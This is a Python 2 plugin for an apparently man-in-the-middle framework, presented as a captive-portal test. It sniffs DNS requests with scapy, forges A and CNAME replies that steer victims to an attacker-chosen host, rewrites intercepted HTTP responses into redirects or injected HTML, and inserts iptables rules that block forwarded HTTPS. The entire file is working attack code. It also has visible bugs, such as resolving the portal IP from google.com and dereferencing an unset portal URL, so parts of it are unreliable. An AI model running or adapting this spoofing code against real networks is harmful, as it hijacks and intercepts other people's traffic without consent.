
import threading
import logging
import sys
import re
from urlparse import urlparse
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

from plugins.plugin import Plugin

# Initialize coloredlogs.
from pprint import pprint #DEBUG
import socket

#from netfilterqueue import NetfilterQueue #TODO

class Portal(Plugin):
    name = 'Portal'
    optname = 'portal'
    desc = 'Captive Portal test plugin'
    version   = "0.2"
    tree_info = ["Captive Portal running"]
    has_opts = True

    def initialize(self, options):
        self.options       = options
        self.ip            = options.ip
        self.mon_interface = options.interface

        #Table for clients not beeing captured
        self.dtable        = {}
        self.portal_ip     = '127.0.0.1'
        self.portal_url    = False
        self.portal_dns    = False
        self.portal_html   = ''

        #TODO: IETF Captive-Portal Identification in DHCP: https://tools.ietf.org/html/draft-wkumari-dhc-capport-16

        if options.portaltemplate:
            self.portal_html = self.parse_template(options.portaltemplate)

        elif options.portalurl:
            #parse url 
            try:
                self.portal_url = urlparse(options.portalurl)
                self.log.debug("Captival portal at {}".format(self.portal_url))
            except Exception, e:
                sys.exit("[-] Error parsing portal url: %s" % e)

            # get portal url ip address
            self.portal_ip = socket.gethostbyname('google.com') #TODO: better method, scapy?

            if options.portaldns:
                #TODO: if options.portaldns
                t2 = threading.Thread(name='captive_dns_thread', target=self.captive_dns, args=(self.mon_interface,))
                t2.setDaemon(True)
                t2.start()
        else:
            sys.exit("[-] Portal requires portal url or portal template")

        #running on an access point
        from core.utils import iptables
        if iptables().http is False and options.filter is None:
            iptables().HTTP(options.listen_port)

            #Setup iptables to block all not allowed traffic
            self._block_traffic()

    def parse_template(self, path):
        if os.path.exists(path): # replace whole content
            f = open(path, 'r')
            data = f.read()
            f.close()
            return data
        else:
            sys.exit("[-] Error reading template file {}".format(path))

    def options(self, options):
        options.add_argument('--portalurl', type=str, dest='portalurl', help='URL of the captive-portal. All requests to this host are allowed with this option.')
        options.add_argument('--portaldns', action='store_true', dest='portaldns', help='Hijack DNS records with captive-portal IP and CNAME.')
        options.add_argument('--portaltemplate', type=str, dest='portaltemplate', help='Local CP file. Should have everything required inline, because of the way this option works.')
        #TODO: Define captive-portal template

    def response(self, response, request, data):
        ip = response.getClientIP()
        hn = response.getRequestHostname()
        self.log.info("[response] {} requesting {}".format(ip, response.uri))
        
        # already requesting captive portal
        if self.portal_url:
            if self.portal_url.hostname == hn:
                #FIXME: verify Ports
                self.log.info("[response] {} already browsing captive portal at {}".format(ip, response.uri))

                return 

        #intercept 
        if self._check_captured(ip) \
                and (hn not in self.ip):
                    
            if self.portal_url:
                self.log.info('[response] {} redirecting from {} to captive portal at "{}"'.format(ip, hn, self.portal_url.geturl()))
                
                # Set response code
                response.code = 302
                # Wipe headers
                response.headers = {}
                response.headers["Location"] = self.portal_url.geturl()
                response.headers["Server"] = "Captive Portal"

                for x in response.headers: #DEBUG
                    self.log.debug("[response] {}: {}".format(x,response.headers[x])) #DEBUG

                data = ""
                return {'response': response, 'request':request, 'data': data}
            else:
                #TODO: paste content from CP template
                html = self.portal_html
                data = str(html)

                # Set response code
                #  see https://tools.ietf.org/html/rfc6585#section-6
                response.code = 511
                response.message = "Network Authentication Required"
                # Wipe headers
                response.headers = {}
                response.headers["Location"] = self.portal_url.geturl()
                response.headers["Server"] = "Captive Portal"

                self.log.info("[response] {} injecting custom html".format(ip, hn))

                return {'response': response, 'request':request, 'data': data}
        return

    def modify(self, packet):
        pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string

        #TODO: Parse request and create response
            # Send cooked response

        packet.drop()


    def captive_dns(self, iface):
        #TODO: utilize nfqueue with reactor
        #  see https://github.com/DanMcInerney/dnsspoof/blob/master/dnsspoof.py
        #  see http://danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/
        #  see http://danmcinerney.org/reliable-dns-spoofing-with-python-twisting-in-arp-poisoning-pt-2/
        """
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')

        nfqueue = NetfilterQueue()
        nfqueue.bind(1, self.modify)
        nfqueue.run()
        """

        #TODO: restrict filter
        sniff(filter="udp and port 53", prn=self.dns_callback, iface=iface)

    def dns_callback(self, packet):
        # Is this a DNS Request
        if packet.haslayer(UDP) \
                and packet.haslayer(DNS) \
                and packet.haslayer(DNSQR):
            req_domain = packet[DNS].qd.qname

            # Request for Address
            if not packet.haslayer(DNSRR):
                # A Record?
                if packet[DNS].qd.qtype == 1:
                    #TODO: Block legitimate DNS responses

                    #pprint(packet, indent=2) #DEBUG

                    # only spoof requests from target IPs
                    if packet[IP].src == self.ip:
                        pprint(packet, indent=2) #DEBUG
                        self.log.info("[dns_callback] saw my own request {}".format(req_domain))

                    elif packet[DNS].qd.qname != self.portal_url.hostname \
                            and self._check_captured(packet[IP].src):

                        query  = packet[DNS].qd
                        answer = DNSRR(
                                rrname = packet[DNS].qd.qname,
                                type   = 'A',
                                rclass = 'IN',
                                ttl    = 1,
                                rdata  = self.portal_ip
                                )

                        # setting hostname(CNAME) of captive portal
                        if self.portal_url:
                            answer = answer / DNSRR(
                                    rrname = packet[DNS].qd.qname,
                                    type   = 'CNAME',
                                    rclass = 'IN',
                                    ttl    = 1,
                                    rdata  = self.portal_url.hostname
                                    )

                        # see https://github.com/gkarlos/vu-security/blob/a8b0a6e962f12b1d18ca6ee8bc11b042b7fcd3b4/DNSpoison.py
                        response = Ether()
                        response = response / IP(dst=packet[IP].src, src=packet[IP].dst)
                        response = response / UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
                        response = response / DNS(
                                id      = packet[DNS].id,
                                qd      = query,
                                qr      = 1L,
                                ra      = 1L,
                                an      = answer)
                        
                        try:
                            #response.show2() #DEBUG
                            #pprint(response, indent=2) #DEBUG
                            sendp(response, iface=self.mon_interface, verbose=False)
                        except Exception as e:
                            #Issue: https://github.com/byt3bl33d3r/MITMf/issues/109
                            self.log.error("[dns_callback] Error while sending spoofed DNS response >{}<".format(e))
                        self.log.info("[dns_callback] {} >> Spoofed DNS for {}".format(packet[IP].src, req_domain))
                    else:
                        self.log.info("[dns_callback] {} Vs {}".format(packet[DNS].qd.qname, self.portal_url.hostname))
                        self.log.info("[dns_callback] {} >> not a target DNS request for {}".format(packet[IP].src, req_domain))
                else:

                    #pprint(packet, indent=2) #DEBUG
                    self.log.info("[dns_callback] {} >> Wrong DNS query type for {}({})".format(packet[IP].src, req_domain, packet[DNS].qd.qtype))
            else:
                #FIXME: Race condition, should drop original Response

                #pprint(packet, indent=4) #DEBUG
                self.log.info("[dns_callback] {} >> DNS response for {}".format(packet[IP].src, req_domain))
        else:
            #pprint(packet, indent=2) #DEBUG
            self.log.info("[dns_callback] >> no DNS request")

    def on_shutdown(self):
        '''This will be called when shutting down'''
        from core.utils import iptables
        iptables().flush()
        #FIXME: add forwarding rules if we are an access point

        pass

    def _check_captured(self, ip):
        #only inject once
        self.log.debug("[_check_captured] {} registered? {}".format(ip, ip in self.dtable))
        return not ip in self.dtable

    def _block_traffic(self):
        self.log.debug("Setting up iptables")
        #TODO: limit to target IPs
        os.system('iptables -t filter -I FORWARD -p tcp --destination-port 443 -j REJECT')
        

    def _check_walledgarden(self, request):
        return
        
        #https://serverfault.com/questions/679393/captive-portal-popups-the-definitive-guide
        """
        Android / Chromebook:
            clients3.google.com

        iOS 6:
            gsp1.apple.com
            *.akamaitechnologies.com

        iOS 7:
            www.appleiphonecell.com
            www.airport.us
            *.apple.com.edgekey.net
            *.akamaiedge.net
            *.akamaitechnologies.com

        iOS 8/9:
            http://www.apple.com/library/test/success.html
            http://captive.apple.com/hotspot-detect.html

        #https://msdn.microsoft.com/de-de/library/windows/hardware/dn408681.aspx
        Windows
            ipv6.msftncsi.com
            www.msftncsi.com
        """

